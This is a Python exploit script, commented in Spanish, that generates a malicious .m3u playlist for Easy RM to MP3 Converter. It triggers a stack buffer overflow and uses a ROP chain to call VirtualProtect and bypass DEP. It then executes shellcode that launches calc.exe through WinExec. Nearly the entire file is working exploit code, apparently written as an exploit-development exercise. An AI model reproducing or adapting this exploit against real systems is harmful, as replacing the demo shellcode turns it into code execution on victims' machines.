fileName='EasyRMToMp3_Exploit_ROP.m3u';
fileC=open(fileName,'w');
junk='\x41'*26018;
eip='\x98\xcd\x02\x10';#RET -> 0x1002cd98
junk2='\x41'*4;#Compensaciòn
rop_gadgets1=(
		"\xab\xda\xa3\x71"#PUSH ESP#POP ESI#RET -> 0x71A3DAAB (valor de stack a esi)
		"\x6b\xdb\xc0\x77"#MOV EAX,ESI#RET -> 0x77C0DB6B (valor de esi [stack] a eax)
		"\xbc\x53\x02\x10"#xor edx,edx#ret -> 0x100253bc
		"\x0d\xbf\x01\x10"#ADC EDX,ESI # POP ESI # RETN 0x1001bf0d (valor de esi [stack] a edx)
		"CCCC"#Compensa pop esi
		"\x88\xa7\x01\x10"#Recuperamos esi PUSH EAX#POP ESI#POP EBP#MOV EAX,1#POP EBX#POP ECX#RETN -> 0x1001a788 
		+"CCCC"*3#Compensamos pops anteriores 
		+"\x6b\xdb\xc0\x77"#Recuperamos eax
		"\xaf\xfb\x01\x10"#ADD ESP,9C#RET -> 0x1001fbaf <---------
    )#                                                                    |
#Parametros para VirtualProtect                                           |
params=(#                                                                 |
        "\xd0\x1a\x80\x7c"#kernel32.dll.virtualprotect -> 0x7c801ad0      |S
        "AAAA"#Direccion de retorno (A donde retornara VirtualProtect)    |A
        "BBBB"#lpAddress (Puntero a ubicaciòn de la shellcode)            |L
        "CCCC"#Length Shellcode (Largo de la shellcode)                   |T
        "DDDD"#flNewProtect (Flag de protecciòn nueva)                    |A
        "\x05\x50\x03\x10"#lpflOldProtect (Direcciòn de escritura)        |N
    );#                                                                   |D
junk3="A"*(0x9c-len(params)) #RELLENO                                     |O
rop_gadgets2=(#                                                           |
        #EAX APUNTARA CERCA DE LA SHELLCODE                               |
        "\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24 <----
        "CCCC"#Compensa el POP EBP anterior
        "\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24 
        "CCCC"#Compensa el POP EBP anterior
        #ESI apuntara al 1er marcador de posición (Parametro 1 de VirtualProtect)
        +"\x1e\xa4\x02\x10"*44# INC ESI # ADD AL,5E # RETN -> 0x1002a41e

        #EAX APUNTARA A LA SHELLCODE
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        
        #############################################################################
        #PRIMER MARCADOR DE POSICIÓN PISADO (Dirección de retorno de VirtualProtect)#
        #############################################################################
        "\x2f\xe8\x01\x10"#MOV [ESI],EAX#XOR EAX,EAX#POP ESI-> 0x1001e82f           #
        #############################################################################
        "CCCC"#Compensa pop esi
        
        #############################################################################
        #PROCESO DE RECUPERACIÓN DE VALORES EAX,ESI                                 #
        ############################################################################################################
        "\x2a\xba\x02\x10"#Recuperamos eax -> #MOV EAX,EDX#RETN -> 0x1002ba2a                                      #
        "\x88\xa7\x01\x10"#Recuperamos esi PUSH EAX#POP ESI#POP EBP#MOV EAX,1#POP EBX#POP ECX#RETN -> 0x1001a788   #
        +"CCCC"*3#Compensamos pops anteriores                                                                      #            
        +"\x6b\xdb\xc0\x77"#Recuperamos eax                                                                        #
        ############################################################################################################
        
        #EAX APUNTARA CERCA DE LA SHELLCODE                               
        "\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24 
        "CCCC"#Compensa el POP EBP anterior
        "\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24 
        "CCCC"#Compensa el POP EBP anterior
        #ESI apuntara al 2do marcador de posicion (Parametro 1 de VirtualProtect)
        +"\x1e\xa4\x02\x10"*48# INC ESI # ADD AL,5E # RETN -> 0x1002a41e

        #EAX APUNTARA A LA SHELLCODE
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        +"\x24\xdc\x02\x10"#ADD EAX,80 # POP EBP # RETN -> 0x1002dc24
        "CCCC"#Compensa el POP EBP anterior
        
        ##############################################################################
        #SEGUNDO MARCADOR DE POSICIÓN PISADO (Puntero a ubicación de la shellcode)   #
        ##############################################################################
        "\x2f\xe8\x01\x10"#MOV [ESI],EAX#XOR EAX,EAX#POP ESI-> 0x1001e82f
        "CCCC"#Compensa pop esi

        #############################################################################
        #PROCESO DE RECUPERACIÓN DE VALORES EAX,ESI                                 #
        ############################################################################################################
        "\x2a\xba\x02\x10"#Recuperamos eax -> #MOV EAX,EDX#RETN -> 0x1002ba2a                                      #
        "\x88\xa7\x01\x10"#Recuperamos esi PUSH EAX#POP ESI#POP EBP#MOV EAX,1#POP EBX#POP ECX#RETN -> 0x1001a788   #
        +"CCCC"*3#Compensamos pops anteriores                                                                      #            
        +"\x6b\xdb\xc0\x77"#Recuperamos eax                                                                        #
        ############################################################################################################
        
        #ESI apuntara al 1er marcador de posición (Parametro 1 de VirtualProtect)
        +"\x1e\xa4\x02\x10"*52# INC ESI # ADD AL,5E # RETN -> 0x1002a41e

        +"\x79\xa7\x02\x10"#XOR EAX,EAX -> 0x1002a779
        "\x4c\xdc\x02\x10"#ADD EAX,100 # POP EBP # RETN -> 0x1002dc4c
        "CCCC"#Compensa pop ebp
        "\x4c\xdc\x02\x10"#ADD EAX,100 # POP EBP # RETN -> 0x1002dc4c
        "CCCC"#Compensa pop ebp
        "\x4c\xdc\x02\x10"#ADD EAX,100 # POP EBP # RETN -> 0x1002dc4c
        "CCCC"#Compensa pop ebp
        "\x4c\xdc\x02\x10"#ADD EAX,100 # POP EBP # RETN -> 0x1002dc4c
        "CCCC"#Compensa pop ebp
        "\x4c\xdc\x02\x10"#ADD EAX,100 # POP EBP # RETN -> 0x1002dc4c
        "CCCC"#Compensa pop ebp
        "\x4c\xdc\x02\x10"#ADD EAX,100 # POP EBP # RETN -> 0x1002dc4c
        "CCCC"#Compensa pop ebp
        
        ##############################################################################
        #TERCER MARCADOR DE POSICIÓN PISADO (tamaño de nuestra shellcode 600)        #
        ##############################################################################
        "\x2f\xe8\x01\x10"#MOV [ESI],EAX#XOR EAX,EAX#POP ESI-> 0x1001e82f
        "CCCC"#Compensa pop esi

        #############################################################################
        #PROCESO DE RECUPERACIÓN DE VALORES EAX,ESI                                 #
        ############################################################################################################
        "\x2a\xba\x02\x10"#Recuperamos eax -> #MOV EAX,EDX#RETN -> 0x1002ba2a                                      #
        "\x88\xa7\x01\x10"#Recuperamos esi PUSH EAX#POP ESI#POP EBP#MOV EAX,1#POP EBX#POP ECX#RETN -> 0x1001a788   #
        +"CCCC"*3#Compensamos pops anteriores                                                                      #            
        +"\x6b\xdb\xc0\x77"#Recuperamos eax                                                                        #
        ############################################################################################################
        
        #ESI apuntara al 1er marcador de posiciòn (Parametro 1 de VirtualProtect)
        +"\x1e\xa4\x02\x10"*56# INC ESI # ADD AL,5E # RETN -> 0x1002a41e

        +"\x79\xa7\x02\x10"#XOR EAX,EAX -> 0x1002a779
        "\x41\xdc\x02\x10"#ADD EAX,40#POP EBP#RETN -> 0x1002dc41
        "CCCC"#Compensa pop ebp
        
        ##############################################################################
        #CUARTO MARCADOR DE POSICIÓN PISADO (flag de protecciòn)                     #
        ##############################################################################
        "\x2f\xe8\x01\x10"#MOV [ESI],EAX#XOR EAX,EAX#POP ESI-> 0x1001e82f
        "CCCC"#Compensa pop esi
        
        #############################################################################
        #PROCESO DE RECUPERACIÓN DE VALORES EAX,ESI                                 #
        ############################################################################################################
        "\x2a\xba\x02\x10"#Recuperamos eax -> #MOV EAX,EDX#RETN -> 0x1002ba2a                                      #
        "\x88\xa7\x01\x10"#Recuperamos esi PUSH EAX#POP ESI#POP EBP#MOV EAX,1#POP EBX#POP ECX#RETN -> 0x1001a788   #
        +"CCCC"*3#Compensamos pops anteriores                                                                      #            
        +"\x6b\xdb\xc0\x77"#Recuperamos eax                                                                        #
        ############################################################################################################

        #ESI apuntara a call VirtualProtect
        +"\x1e\xa4\x02\x10"*40# INC ESI # ADD AL,5E # RETN -> 0x1002a41e
        +"\x6b\xdb\xc0\x77"#MOV EAX,ESI#RET -> 0x77C0DB6B
        "\x41\xbe\x02\x10"#XCHG EAX,ESP # RETN -> 0x1002be41
    );

nops="\x90"*400
shellcode=(
        "\x33\xd2"                  #xor edx,edx
        "\x52"                      #push edx
        "\x68\x2e\x65\x78\x65"	    #push ".exe"
        "\x68\x63\x61\x6c\x63"	    #push "calc"
        "\x89\xe0"		    #mov eax,esp
        "\x6a\x01"		    #push 1
        "\x50"			    #push eax
        "\xbb\x4d\x11\x86\x7c"	    #mov ebx,kernel32.WinExec -> mov ebx,0x7c86114d
        "\xff\xd3"		    #call ebx
        "\x6a\x01"                  #push 1
        "\xbb\xa2\xca\x81\x7c"      #mov ebx,kernel32.ExitProcess-> mov ebx,0x7c81caa2
        "\xff\xd3"                  #call ebx
    );
"""
           ______1_______                ____________3________________                                        
          |              |              |                             |
          ^              v              v                             ^
##############################################################################################
# junk # EIP # junk2 # ROPG1 # Ptr VirtualProtect #PARAMS # junk3 # ROPG2 # NOPS # SHELLCODE #
##############################################################################################
                         v              v_______________4____________ ^ _______________^
                         |___________________2________________________|
"""
payload=junk+eip+junk2+rop_gadgets1+params+junk3+rop_gadgets2+nops+shellcode;
print("Payload size: "+str(len(payload)));
print("Shellcode size: "+str(len(shellcode)));
contentExploit=payload;
fileC.write(contentExploit);
fileC.close();
